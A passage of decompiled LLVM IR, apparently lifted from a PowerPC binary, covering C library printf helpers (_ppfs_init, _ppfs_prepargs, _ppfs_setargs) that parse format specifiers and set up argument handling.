  uselistorder i32* %r29.global-to-local, { 0, 7, 1, 2, 3, 4, 5, 6, 8 }
  uselistorder i32* %r24.global-to-local, { 1, 0, 2, 3, 4, 5, 6, 7, 8 }
  uselistorder i32* %r23.global-to-local, { 9, 0, 1, 4, 2, 5, 6, 3, 7, 8, 10 }
  uselistorder i32* %r11.global-to-local, { 1, 2, 3, 4, 6, 5, 0, 7 }
  uselistorder i32* %r10.global-to-local, { 2, 1, 0, 3 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 22, 21, 23, 24, 25, 26, 27, 28, 29, 30, 0, 37, 31, 32, 33, 34, 35, 36 }
  uselistorder i32* %ctr.global-to-local, { 2, 1, 0, 4, 5, 3 }
  uselistorder i32 (i32, i8, i32)* @_charpad, { 1, 2, 3, 0 }
  uselistorder i8 32, { 2, 1, 3, 0, 4, 5, 6 }
  uselistorder i32 ()* @__GI_wcsrtombs, { 1, 0 }
  uselistorder label %dec_label_pc_1000c1f0, { 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_1000c1ec, { 1, 9, 2, 3, 4, 0, 5, 6, 7, 8 }
  uselistorder label %dec_label_pc_1000c1dc, { 1, 0 }
  uselistorder label %dec_label_pc_1000c1c0, { 0, 2, 1 }
  uselistorder label %dec_label_pc_1000c194, { 1, 0 }
  uselistorder label %dec_label_pc_1000c170, { 1, 0 }
  uselistorder label %dec_label_pc_1000c0fc, { 1, 0 }
  uselistorder label %dec_label_pc_1000c0d4, { 1, 0 }
  uselistorder label %dec_label_pc_1000c0bc, { 1, 0 }
  uselistorder label %dec_label_pc_1000c0a8, { 1, 0 }
  uselistorder label %dec_label_pc_1000c088, { 0, 2, 1 }
  uselistorder label %dec_label_pc_1000c088thread-pre-split, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_1000c07c, { 1, 0 }
  uselistorder label %dec_label_pc_1000c00c, { 1, 0 }
  uselistorder label %dec_label_pc_1000bff8, { 1, 0 }
  uselistorder label %dec_label_pc_1000bf70, { 1, 0 }
  uselistorder label %dec_label_pc_1000bec0, { 1, 0 }
  uselistorder label %dec_label_pc_1000bea8, { 6, 2, 3, 1, 5, 0, 4 }
  uselistorder label %dec_label_pc_1000be58, { 1, 0 }
  uselistorder label %dec_label_pc_1000be3c, { 4, 0, 2, 3, 1 }
  uselistorder label %dec_label_pc_1000bdc8, { 1, 0 }
  uselistorder label %dec_label_pc_1000bdac, { 1, 0 }
  uselistorder label %dec_label_pc_1000bd98, { 1, 0 }
  uselistorder label %dec_label_pc_1000bd94, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000bd68, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1000bcf0, { 1, 0, 3, 2 }
  uselistorder label %dec_label_pc_1000bcdc.dec_label_pc_1000bcdc_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_1000bcb4, { 1, 0 }
  uselistorder label %dec_label_pc_1000bc50, { 1, 0 }
  uselistorder label %dec_label_pc_1000bc44, { 1, 0 }
  uselistorder label %dec_label_pc_1000bc08, { 1, 0 }
}

define i32 @_ppfs_init(i32* %arg1) local_unnamed_addr {
entry:
  %ctr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %v0_1000c20c = load i32, i32* @lr, align 4
  store i32 %v0_1000c20c, i32* %r0.global-to-local, align 4
  store i32 %tmp, i32* @r31, align 4
  %v0_1000c21c = load i32, i32* @r4, align 4
  store i32 %v0_1000c21c, i32* @r30, align 4
  store i32 268485164, i32* @lr, align 4
  %v3_1000c228 = call i32 @__GI_memset(i32 0, i32 160, i32 160)
  %v0_1000c22c = load i32, i32* @r31, align 4
  %v1_1000c22c = add i32 %v0_1000c22c, 24
  %v2_1000c22c = inttoptr i32 %v1_1000c22c to i32*
  %v3_1000c22c = load i32, i32* %v2_1000c22c, align 4
  store i32 %v3_1000c22c, i32* %r9.global-to-local, align 4
  store i32 9, i32* %r11.global-to-local, align 4
  %v0_1000c234 = load i32, i32* @r30, align 4
  %v2_1000c234 = inttoptr i32 %v0_1000c22c to i32*
  store i32 %v0_1000c234, i32* %v2_1000c234, align 4
  %v0_1000c238 = load i32, i32* %r11.global-to-local, align 4
  store i32 %v0_1000c238, i32* %ctr.global-to-local, align 4
  %v0_1000c23c = load i32, i32* %r9.global-to-local, align 4
  %v1_1000c23c = add i32 %v0_1000c23c, -1
  store i32 8, i32* %r0.global-to-local, align 4
  %v1_1000c244 = load i32, i32* @r31, align 4
  %v2_1000c244 = add i32 %v1_1000c244, 24
  %v3_1000c244 = inttoptr i32 %v2_1000c244 to i32*
  store i32 %v1_1000c23c, i32* %v3_1000c244, align 4
  %v0_1000c248 = load i32, i32* @r31, align 4
  %v1_1000c248 = add i32 %v0_1000c248, 40
  store i32 %v1_1000c248, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1000c24c

dec_label_pc_1000c24c:                            ; preds = %dec_label_pc_1000c24c, %entry
  %v1_1000c24c = phi i32 [ %v1_1000c250, %dec_label_pc_1000c24c ], [ %v1_1000c248, %entry ]
  %v0_1000c24c = load i32, i32* %r0.global-to-local, align 4
  %v2_1000c24c = inttoptr i32 %v1_1000c24c to i32*
  store i32 %v0_1000c24c, i32* %v2_1000c24c, align 4
  %v0_1000c250 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000c250 = add i32 %v0_1000c250, 4
  store i32 %v1_1000c250, i32* %r9.global-to-local, align 4
  %v0_1000c254 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000c254 = add i32 %v0_1000c254, -1
  store i32 %v1_1000c254, i32* %ctr.global-to-local, align 4
  %v2_1000c254 = icmp eq i32 %v1_1000c254, 0
  br i1 %v2_1000c254, label %dec_label_pc_1000c258, label %dec_label_pc_1000c24c

dec_label_pc_1000c258:                            ; preds = %dec_label_pc_1000c24c
  %v0_1000c258 = load i32, i32* @r30, align 4
  br label %dec_label_pc_1000c298

dec_label_pc_1000c268:                            ; preds = %dec_label_pc_1000c298
  %v3_1000c2a0 = icmp eq i8 %v2_1000c298, 37
  br i1 %v3_1000c2a0, label %dec_label_pc_1000c26c, label %dec_label_pc_1000c294

dec_label_pc_1000c26c:                            ; preds = %dec_label_pc_1000c268
  %v1_1000c26c = add i32 %v0_1000c26c, 1
  %v2_1000c26c = inttoptr i32 %v1_1000c26c to i8*
  %v3_1000c26c = load i8, i8* %v2_1000c26c, align 1
  %v4_1000c26c = zext i8 %v3_1000c26c to i32
  store i32 %v4_1000c26c, i32* %r0.global-to-local, align 4
  store i32 %v1_1000c26c, i32* %r9.global-to-local, align 4
  %v3_1000c274 = icmp eq i8 %v3_1000c26c, 37
  br i1 %v3_1000c274, label %dec_label_pc_1000c294, label %dec_label_pc_1000c27c

dec_label_pc_1000c27c:                            ; preds = %dec_label_pc_1000c26c
  %v0_1000c270 = load i32, i32* @r31, align 4
  %v2_1000c27c = inttoptr i32 %v0_1000c270 to i32*
  store i32 %v1_1000c26c, i32* %v2_1000c27c, align 4
  store i32 268485252, i32* @lr, align 4
  %v1_1000c280 = load i32, i32* %r9.global-to-local, align 4
  %v3_1000c280 = call i32 @_ppfs_parsespec(i32* %v2_1000c27c, i32 %v1_1000c280)
  %v1_1000c284 = icmp slt i32 %v3_1000c280, 0
  br i1 %v1_1000c284, label %dec_label_pc_1000c2b0, label %dec_label_pc_1000c28c

dec_label_pc_1000c28c:                            ; preds = %dec_label_pc_1000c27c
  %v0_1000c28c = load i32, i32* @r31, align 4
  %v1_1000c28c = inttoptr i32 %v0_1000c28c to i32*
  %v2_1000c28c = load i32, i32* %v1_1000c28c, align 4
  br label %dec_label_pc_1000c298

dec_label_pc_1000c294:                            ; preds = %dec_label_pc_1000c268, %dec_label_pc_1000c26c
  %v0_1000c294 = phi i32 [ %v0_1000c26c, %dec_label_pc_1000c268 ], [ %v1_1000c26c, %dec_label_pc_1000c26c ]
  %v1_1000c294 = add i32 %v0_1000c294, 1
  br label %dec_label_pc_1000c298

dec_label_pc_1000c298:                            ; preds = %dec_label_pc_1000c28c, %dec_label_pc_1000c294, %dec_label_pc_1000c258
  %v0_1000c26c = phi i32 [ %v0_1000c258, %dec_label_pc_1000c258 ], [ %v1_1000c294, %dec_label_pc_1000c294 ], [ %v2_1000c28c, %dec_label_pc_1000c28c ]
  store i32 %v0_1000c26c, i32* %r9.global-to-local, align 4
  %v1_1000c298 = inttoptr i32 %v0_1000c26c to i8*
  %v2_1000c298 = load i8, i8* %v1_1000c298, align 1
  %v3_1000c298 = zext i8 %v2_1000c298 to i32
  store i32 %v3_1000c298, i32* %r0.global-to-local, align 4
  %v3_1000c29c = icmp eq i8 %v2_1000c298, 0
  br i1 %v3_1000c29c, label %dec_label_pc_1000c2a8, label %dec_label_pc_1000c268

dec_label_pc_1000c2a8:                            ; preds = %dec_label_pc_1000c298
  %v0_1000c2a8 = load i32, i32* @r30, align 4
  %v1_1000c2a8 = load i32, i32* @r31, align 4
  %v2_1000c2a8 = inttoptr i32 %v1_1000c2a8 to i32*
  store i32 %v0_1000c2a8, i32* %v2_1000c2a8, align 4
  br label %dec_label_pc_1000c2b0

dec_label_pc_1000c2b0:                            ; preds = %dec_label_pc_1000c27c, %dec_label_pc_1000c2a8
  %storemerge = phi i32 [ 0, %dec_label_pc_1000c2a8 ], [ -1, %dec_label_pc_1000c27c ]
  store i32 %v0_1000c20c, i32* %r0.global-to-local, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i8 %v2_1000c298, { 1, 2, 0 }
  uselistorder i32 %v0_1000c26c, { 2, 3, 1, 0 }
  uselistorder i32 %v1_1000c254, { 1, 0 }
  uselistorder i32 %v1_1000c250, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 0, 2, 1, 3, 4, 5 }
  uselistorder label %dec_label_pc_1000c2b0, { 1, 0 }
  uselistorder label %dec_label_pc_1000c298, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1000c294, { 1, 0 }
}

define i32 @_ppfs_prepargs(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r3, align 4
  %v0_1000c2c4 = load i32, i32* @lr, align 4
  %v0_1000c2cc = load i32, i32* @r3, align 4
  store i32 %v0_1000c2cc, i32* @r31, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_1000c2e8 = add i32 %v0_1000c2cc, 24
  %v2_1000c2e8 = inttoptr i32 %v1_1000c2e8 to i32*
  %v3_1000c2e8 = load i32, i32* %v2_1000c2e8, align 4
  store i32 %v3_1000c2e8, i32* @r30, align 4
  %tmp4 = icmp slt i32 %v3_1000c2e8, 1
  br i1 %tmp4, label %dec_label_pc_1000c30c, label %dec_label_pc_1000c2f4

dec_label_pc_1000c2f4:                            ; preds = %entry
  %v2_1000c2f4 = add i32 %v0_1000c2cc, 8
  %v3_1000c2f4 = inttoptr i32 %v2_1000c2f4 to i32*
  store i32 0, i32* %v3_1000c2f4, align 4
  %v0_1000c2f8 = load i32, i32* @r30, align 4
  %v1_1000c2f8 = load i32, i32* @r3, align 4
  %v2_1000c2f8 = add i32 %v1_1000c2f8, 28
  %v3_1000c2f8 = inttoptr i32 %v2_1000c2f8 to i32*
  store i32 %v0_1000c2f8, i32* %v3_1000c2f8, align 4
  %v0_1000c2fc = load i32, i32* %r0.global-to-local, align 4
  %v1_1000c2fc = load i32, i32* @r3, align 4
  %v2_1000c2fc = add i32 %v1_1000c2fc, 24
  %v3_1000c2fc = inttoptr i32 %v2_1000c2fc to i32*
  store i32 %v0_1000c2fc, i32* %v3_1000c2fc, align 4
  %v0_1000c300 = load i32, i32* %r0.global-to-local, align 4
  %v1_1000c300 = load i32, i32* @r3, align 4
  %v2_1000c300 = add i32 %v1_1000c300, 4
  %v3_1000c300 = inttoptr i32 %v2_1000c300 to i32*
  store i32 %v0_1000c300, i32* %v3_1000c300, align 4
  store i32 268485384, i32* @lr, align 4
  %v0_1000c304 = call i32 @_ppfs_setargs()
  store i32 %v0_1000c304, i32* %r3.global-to-local, align 4
  %v0_1000c308 = load i32, i32* @r30, align 4
  %v1_1000c308 = load i32, i32* @r31, align 4
  %v2_1000c308 = add i32 %v1_1000c308, 24
  %v3_1000c308 = inttoptr i32 %v2_1000c308 to i32*
  store i32 %v0_1000c308, i32* %v3_1000c308, align 4
  %v0_1000c31c.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000c30c

dec_label_pc_1000c30c:                            ; preds = %entry, %dec_label_pc_1000c2f4
  %v0_1000c31c = phi i32 [ %v0_1000c2cc, %entry ], [ %v0_1000c31c.pre, %dec_label_pc_1000c2f4 ]
  store i32 %v0_1000c2c4, i32* %r0.global-to-local, align 4
  ret i32 %v0_1000c31c

; uselistorder directives
  uselistorder i32 ()* @_ppfs_setargs, { 1, 0 }
  uselistorder label %dec_label_pc_1000c30c, { 1, 0 }
}

define i32 @_ppfs_setargs() local_unnamed_addr {
entry:
  %cr7_gt.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %v0_1000c320 = load i32, i32* @r3, align 4
  %v1_1000c320 = add i32 %v0_1000c320, 24
  %v2_1000c320 = inttoptr i32 %v1_1000c320 to i32*
  %v3_1000c320 = load i32, i32* %v2_1000c320, align 4
  store i32 %v3_1000c320, i32* %r0.global-to-local, align 4
  %v1_1000c324 = add i32 %v0_1000c320, 88
  store i32 %v1_1000c324, i32* @r8, align 4
  %v1_1000c328 = add i32 %v0_1000c320, 8
  %v2_1000c328 = inttoptr i32 %v1_1000c328 to i32*
  %v3_1000c328 = load i32, i32* %v2_1000c328, align 4
  store i32 %v3_1000c328, i32* %r9.global-to-local, align 4
  %v2_1000c32c = icmp sgt i32 %v3_1000c320, 0
  %v3_1000c32c = icmp eq i32 %v3_1000c320, 0
  store i1 %v2_1000c32c, i1* %cr7_gt.global-to-local, align 1
  br i1 %v3_1000c32c, label %dec_label_pc_1000c334, label %dec_label_pc_1000c520

dec_label_pc_1000c334:                            ; preds = %entry
  store i32 -2147483648, i32* %r0.global-to-local, align 4
  %v3_1000c338 = icmp ne i32 %v3_1000c328, -2147483648
  %v4_1000c338 = icmp eq i32 %v3_1000c328, -2147483648
  store i1 %v3_1000c338, i1* %cr7_gt.global-to-local, align 1
  br i1 %v4_1000c338, label %dec_label_pc_1000c340, label %dec_label_pc_1000c380

dec_label_pc_1000c340:                            ; preds = %dec_label_pc_1000c334
  %v1_1000c340 = add i32 %v0_1000c320, 76
  %v2_1000c340 = inttoptr i32 %v1_1000c340 to i8*
  %v3_1000c340 = load i8, i8* %v2_1000c340, align 1
  %v4_1000c340 = zext i8 %v3_1000c340 to i32
  store i32 %v4_1000c340, i32* %r10.global-to-local, align 4
  store i32 %v1_1000c340, i32* %r11.global-to-local, align 4
  %v2_1000c348 = icmp ugt i8 %v3_1000c340, 8
  store i1 %v2_1000c348, i1* %cr7_gt.global-to-local, align 1
  %tmp = icmp ugt i8 %v3_1000c340, 7
  br i1 %tmp, label %dec_label_pc_1000c368, label %dec_label_pc_1000c350

dec_label_pc_1000c350:                            ; preds = %dec_label_pc_1000c340
  %v1_1000c350 = add i32 %v0_1000c320, 84
  %v2_1000c350 = inttoptr i32 %v1_1000c350 to i32*
  %v3_1000c350 = load i32, i32* %v2_1000c350, align 4
  %v1_1000c354 = mul nuw nsw i32 %v4_1000c340, 4
  %v2_1000c358 = add i32 %v3_1000c350, %v1_1000c354
  store i32 %v2_1000c358, i32* %r9.global-to-local, align 4
  %v1_1000c35c = add nuw nsw i32 %v4_1000c340, 1
  store i32 %v1_1000c35c, i32* %r0.global-to-local, align 4
  %v1_1000c360 = trunc i32 %v1_1000c35c to i8
  store i8 %v1_1000c360, i8* %v2_1000c340, align 1
  br label %dec_label_pc_1000c374

dec_label_pc_1000c368:                            ; preds = %dec_label_pc_1000c340
  %v1_1000c368 = add i32 %v0_1000c320, 80
  %v2_1000c368 = inttoptr i32 %v1_1000c368 to i32*
  %v3_1000c368 = load i32, i32* %v2_1000c368, align 4
  store i32 %v3_1000c368, i32* %r9.global-to-local, align 4
  %v1_1000c36c = add i32 %v3_1000c368, 4
  store i32 %v1_1000c36c, i32* %r0.global-to-local, align 4
  store i32 %v1_1000c36c, i32* %v2_1000c368, align 4
  br label %dec_label_pc_1000c374

dec_label_pc_1000c374:                            ; preds = %dec_label_pc_1000c350, %dec_label_pc_1000c368
  %v0_1000c374 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000c374 = inttoptr i32 %v0_1000c374 to i32*
  %v2_1000c374 = load i32, i32* %v1_1000c374, align 4
  store i32 %v2_1000c374, i32* %r0.global-to-local, align 4
  %v1_1000c378 = load i32, i32* @r8, align 4
  %v2_1000c378 = inttoptr i32 %v1_1000c378 to i32*
  store i32 %v2_1000c374, i32* %v2_1000c378, align 4
  %v0_1000c37c = load i32, i32* %r0.global-to-local, align 4
  %v1_1000c37c = load i32, i32* @r3, align 4
  %v2_1000c37c = add i32 %v1_1000c37c, 8
  %v3_1000c37c = inttoptr i32 %v2_1000c37c to i32*
  store i32 %v0_1000c37c, i32* %v3_1000c37c, align 4
  %v0_1000c380.pre = load i32, i32* @r3, align 4
  br label %dec_label_pc_1000c380

dec_label_pc_1000c380:                            ; preds = %dec_label_pc_1000c334, %dec_label_pc_1000c374
  %v2_1000c3b0 = phi i32 [ %v0_1000c320, %dec_label_pc_1000c334 ], [ %v0_1000c380.pre, %dec_label_pc_1000c374 ]
  %v1_1000c380 = add i32 %v2_1000c3b0, 4
  %v2_1000c380 = inttoptr i32 %v1_1000c380 to i32*
  %v3_1000c380 = load i32, i32* %v2_1000c380, align 4
  store i32 %v3_1000c380, i32* %r0.global-to-local, align 4
  store i32 -2147483648, i32* %r9.global-to-local, align 4
  %v3_1000c388 = icmp ne i32 %v3_1000c380, -2147483648
  %v4_1000c388 = icmp eq i32 %v3_1000c380, -2147483648
  store i1 %v3_1000c388, i1* %cr7_gt.global-to-local, align 1
  br i1 %v4_1000c388, label %dec_label_pc_1000c390, label %dec_label_pc_1000c510.preheader

dec_label_pc_1000c390:                            ; preds = %dec_label_pc_1000c380
  %v1_1000c390 = add i32 %v2_1000c3b0, 76
  %v2_1000c390 = inttoptr i32 %v1_1000c390 to i8*
  %v3_1000c390 = load i8, i8* %v2_1000c390, align 1
  %v4_1000c390 = zext i8 %v3_1000c390 to i32
  store i32 %v4_1000c390, i32* %r10.global-to-local, align 4
  store i32 %v1_1000c390, i32* %r11.global-to-local, align 4
  %v2_1000c398 = icmp ugt i8 %v3_1000c390, 8
  store i1 %v2_1000c398, i1* %cr7_gt.global-to-local, align 1
  %tmp22 = icmp ugt i8 %v3_1000c390, 7
  br i1 %tmp22, label %dec_label_pc_1000c3b8, label %dec_label_pc_1000c3a0

dec_label_pc_1000c3a0:                            ; preds = %dec_label_pc_1000c390
  %v1_1000c3a0 = add i32 %v2_1000c3b0, 84
  %v2_1000c3a0 = inttoptr i32 %v1_1000c3a0 to i32*
  %v3_1000c3a0 = load i32, i32* %v2_1000c3a0, align 4
  %v1_1000c3a4 = mul nuw nsw i32 %v4_1000c390, 4
  %v2_1000c3a8 = add i32 %v3_1000c3a0, %v1_1000c3a4
  store i32 %v2_1000c3a8, i32* %r9.global-to-local, align 4
  %v1_1000c3ac = add nuw nsw i32 %v4_1000c390, 1
  store i32 %v1_1000c3ac, i32* %r0.global-to-local, align 4
  %v1_1000c3b0 = trunc i32 %v1_1000c3ac to i8
  store i8 %v1_1000c3b0, i8* %v2_1000c390, align 1
  br label %dec_label_pc_1000c3c4

dec_label_pc_1000c3b8:                            ; preds = %dec_label_pc_1000c390
  %v1_1000c3b8 = add i32 %v2_1000c3b0, 80
  %v2_1000c3b8 = inttoptr i32 %v1_1000c3b8 to i32*
  %v3_1000c3b8 = load i32, i32* %v2_1000c3b8, align 4
  store i32 %v3_1000c3b8, i32* %r9.global-to-local, align 4
  %v1_1000c3bc = add i32 %v3_1000c3b8, 4
  store i32 %v1_1000c3bc, i32* %r0.global-to-local, align 4
  store i32 %v1_1000c3bc, i32* %v2_1000c3b8, align 4
  br label %dec_label_pc_1000c3c4

dec_label_pc_1000c3c4:                            ; preds = %dec_label_pc_1000c3a0, %dec_label_pc_1000c3b8
  %v0_1000c3c4 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000c3c4 = inttoptr i32 %v0_1000c3c4 to i32*
  %v2_1000c3c4 = load i32, i32* %v1_1000c3c4, align 4
  store i32 %v2_1000c3c4, i32* %r0.global-to-local, align 4
  %v1_1000c3c8 = load i32, i32* @r8, align 4
  %v2_1000c3c8 = inttoptr i32 %v1_1000c3c8 to i32*
  store i32 %v2_1000c3c4, i32* %v2_1000c3c8, align 4
  %v0_1000c3cc = load i32, i32* %r0.global-to-local, align 4
  %v1_1000c3cc = load i32, i32* @r3, align 4
  %v2_1000c3cc = add i32 %v1_1000c3cc, 4
  %v3_1000c3cc = inttoptr i32 %v2_1000c3cc to i32*
  store i32 %v0_1000c3cc, i32* %v3_1000c3cc, align 4
  %v0_1000c5105.pre = load i32, i32* @r3, align 4
  br label %dec_label_pc_1000c510.preheader

dec_label_pc_1000c510.preheader:                  ; preds = %dec_label_pc_1000c380, %dec_label_pc_1000c3c4
  %v0_1000c5105 = phi i32 [ %v2_1000c3b0, %dec_label_pc_1000c380 ], [ %v0_1000c5105.pre, %dec_label_pc_1000c3c4 ]
  store i32 0, i32* @r7, align 4
  %v1_1000c5106 = add i32 %v0_1000c5105, 28
  %v2_1000c5107 = inttoptr i32 %v1_1000c5106 to i32*
  %v3_1000c5108 = load i32, i32* %v2_1000c5107, align 4
  store i32 %v3_1000c5108, i32* %r0.global-to-local, align 4
  %v2_1000c5149 = icmp sgt i32 %v3_1000c5108, 0
  %v3_1000c51410 = icmp slt i32 %v3_1000c5108, 0
  store i1 %v3_1000c51410, i1* %cr7_gt.global-to-local, align 1
  br i1 %v2_1000c5149, label %dec_label_pc_1000c3d8, label %dec_label_pc_1000c560

dec_label_pc_1000c3d8:                            ; preds = %dec_label_pc_1000c510.preheader, %dec_label_pc_1000c50c
  %v2_1000c4ec = phi i32 [ %v0_1000c510, %dec_label_pc_1000c50c ], [ %v0_1000c5105, %dec_label_pc_1000c510.preheader ]
  %v0_1000c3d8 = phi i32 [ %v1_1000c50c, %dec_label_pc_1000c50c ], [ 0, %dec_label_pc_1000c510.preheader ]
  %v1_1000c3d8 = mul i32 %v0_1000c3d8, 4
  %v2_1000c3dc = add i32 %v1_1000c3d8, %v2_1000c4ec
  store i32 %v2_1000c3dc, i32* %r9.global-to-local, align 4
  %v1_1000c3e0 = add i32 %v2_1000c3dc, 40
  %v2_1000c3e0 = inttoptr i32 %v1_1000c3e0 to i32*
  %v3_1000c3e0 = load i32, i32* %v2_1000c3e0, align 4
  store i32 %v3_1000c3e0, i32* %r0.global-to-local, align 4
  %v2_1000c3e4 = icmp sgt i32 %v3_1000c3e0, 8
  %v3_1000c3e4 = icmp eq i32 %v3_1000c3e0, 8
  store i1 %v2_1000c3e4, i1* %cr7_gt.global-to-local, align 1
  br i1 %v3_1000c3e4, label %dec_label_pc_1000c50c, label %dec_label_pc_1000c3ec

dec_label_pc_1000c3ec:                            ; preds = %dec_label_pc_1000c3d8
  %v1_1000c3ec = add i32 %v2_1000c4ec, 76
  store i32 %v1_1000c3ec, i32* %r10.global-to-local, align 4
  br i1 %v2_1000c3e4, label %dec_label_pc_1000c408, label %dec_label_pc_1000c3f4

dec_label_pc_1000c3f4:                            ; preds = %dec_label_pc_1000c3ec
  %v2_1000c3f4 = icmp sgt i32 %v3_1000c3e0, 2
  store i1 %v2_1000c3f4, i1* %cr7_gt.global-to-local, align 1
  %tmp23 = icmp slt i32 %v3_1000c3e0, 3
  br i1 %tmp23, label %dec_label_pc_1000c4d0, label %dec_label_pc_1000c420

dec_label_pc_1000c408:                            ; preds = %dec_label_pc_1000c3ec
  %v2_1000c408 = icmp sgt i32 %v3_1000c3e0, 1024
  store i1 %v2_1000c408, i1* %cr7_gt.global-to-local, align 1
  %tmp24 = icmp slt i32 %v3_1000c3e0, 1025
  br i1 %tmp24, label %dec_label_pc_1000c4d0, label %dec_label_pc_1000c414

dec_label_pc_1000c414:                            ; preds = %dec_label_pc_1000c408
  %v2_1000c414 = icmp sgt i32 %v3_1000c3e0, 2048
  %v3_1000c414 = icmp eq i32 %v3_1000c3e0, 2048
  store i1 %v2_1000c414, i1* %cr7_gt.global-to-local, align 1
  br i1 %v3_1000c414, label %dec_label_pc_1000c428, label %dec_label_pc_1000c41c

dec_label_pc_1000c41c:                            ; preds = %dec_label_pc_1000c414
  %v2_1000c41c = icmp sgt i32 %v3_1000c3e0, 2055
  %v3_1000c41c = icmp eq i32 %v3_1000c3e0, 2055
  store i1 %v2_1000c41c, i1* %cr7_gt.global-to-local, align 1
  br i1 %v3_1000c41c, label %dec_label_pc_1000c484, label %dec_label_pc_1000c4d0

dec_label_pc_1000c420:                            ; preds = %dec_label_pc_1000c3f4
  %v3_1000c400 = icmp eq i32 %v3_1000c3e0, 7
  store i1 false, i1* %cr7_gt.global-to-local, align 1
  br i1 %v3_1000c400, label %dec_label_pc_1000c484, label %dec_label_pc_1000c4d0

dec_label_pc_1000c428:                            ; preds = %dec_label_pc_1000c414
  %v2_1000c428 = inttoptr i32 %v1_1000c3ec to i8*
  %v3_1000c428 = load i8, i8* %v2_1000c428, align 1
  %v4_1000c428 = zext i8 %v3_1000c428 to i32
  %v2_1000c42c = icmp ugt i8 %v3_1000c428, 6
  store i1 %v2_1000c42c, i1* %cr7_gt.global-to-local, align 1
  %tmp28 = urem i8 %v3_1000c428, 2
  %v1_1000c430 = zext i8 %tmp28 to i32
  store i32 %v1_1000c430, i32* %r9.global-to-local, align 4
  %v2_1000c434 = add nuw nsw i32 %v1_1000c430, %v4_1000c428
  store i32 %v2_1000c434, i32* %r0.global-to-local, align 4
  %v1_1000c438 = trunc i32 %v2_1000c434 to i8
  store i8 %v1_1000c438, i8* %v2_1000c428, align 1
  %v0_1000c43c = load i1, i1* %cr7_gt.global-to-local, align 1
  br i1 %v0_1000c43c, label %dec_label_pc_1000c45c, label %dec_label_pc_1000c440

dec_label_pc_1000c440:                            ; preds = %dec_label_pc_1000c428
  %v0_1000c440 = load i32, i32* %r0.global-to-local, align 4
  %v1_1000c440 = urem i32 %v0_1000c440, 256
  store i32 %v1_1000c440, i32* %r9.global-to-local, align 4
  %v0_1000c444 = load i32, i32* %r10.global-to-local, align 4
  %v1_1000c444 = add i32 %v0_1000c444, 8
  %v2_1000c444 = inttoptr i32 %v1_1000c444 to i32*
  %v3_1000c444 = load i32, i32* %v2_1000c444, align 4
  %v1_1000c448 = mul nuw nsw i32 %v1_1000c440, 4
  store i32 %v1_1000c448, i32* %r0.global-to-local, align 4
  %v1_1000c44c = add nuw nsw i32 %v1_1000c440, 2
  store i32 %v1_1000c44c, i32* %r9.global-to-local, align 4
  %v2_1000c450 = add i32 %v3_1000c444, %v1_1000c448
  store i32 %v2_1000c450, i32* %r11.global-to-local, align 4
  %v1_1000c454 = trunc i32 %v1_1000c44c to i8
  %v2_1000c454 = load i32, i32* @r3, align 4
  %v3_1000c454 = add i32 %v2_1000c454, 76
  %v4_1000c454 = inttoptr i32 %v3_1000c454 to i8*
  store i8 %v1_1000c454, i8* %v4_1000c454, align 1
  br label %dec_label_pc_1000c470

dec_label_pc_1000c45c:                            ; preds = %dec_label_pc_1000c428
  %v0_1000c45c = load i32, i32* %r10.global-to-local, align 4
  %v1_1000c45c = add i32 %v0_1000c45c, 4
  %v2_1000c45c = inttoptr i32 %v1_1000c45c to i32*
  %v3_1000c45c = load i32, i32* %v2_1000c45c, align 4
  %v1_1000c460 = add i32 %v3_1000c45c, 7
  store i32 %v1_1000c460, i32* %r9.global-to-local, align 4
  %v1_1000c464 = call i32 @__asm_rlwinm(i32 %v1_1000c460, i32 0, i32 0, i32 28)
  store i32 %v1_1000c464, i32* %r11.global-to-local, align 4
  %v1_1000c468 = add i32 %v1_1000c464, 8
  store i32 %v1_1000c468, i32* %r0.global-to-local, align 4
  %v1_1000c46c = load i32, i32* %r10.global-to-local, align 4
  %v2_1000c46c = add i32 %v1_1000c46c, 4
  %v3_1000c46c = inttoptr i32 %v2_1000c46c to i32*
  store i32 %v1_1000c468, i32* %v3_1000c46c, align 4
  br label %dec_label_pc_1000c470

dec_label_pc_1000c470:                            ; preds = %dec_label_pc_1000c440, %dec_label_pc_1000c45c
  %v0_1000c470 = load i32, i32* %r11.global-to-local, align 4
  %v1_1000c470 = inttoptr i32 %v0_1000c470 to i32*
  %v2_1000c470 = load i32, i32* %v1_1000c470, align 4
  store i32 %v2_1000c470, i32* %r9.global-to-local, align 4
  %v1_1000c474 = add i32 %v0_1000c470, 4
  %v2_1000c474 = inttoptr i32 %v1_1000c474 to i32*
  %v3_1000c474 = load i32, i32* %v2_1000c474, align 4
  store i32 %v3_1000c474, i32* %r10.global-to-local, align 4
  %v1_1000c478 = load i32, i32* @r8, align 4
  %v2_1000c478 = inttoptr i32 %v1_1000c478 to i32*
  store i32 %v2_1000c470, i32* %v2_1000c478, align 4
  %v0_1000c47c = load i32, i32* %r10.global-to-local, align 4
  %v1_1000c47c = load i32, i32* @r8, align 4
  %v2_1000c47c = add i32 %v1_1000c47c, 4
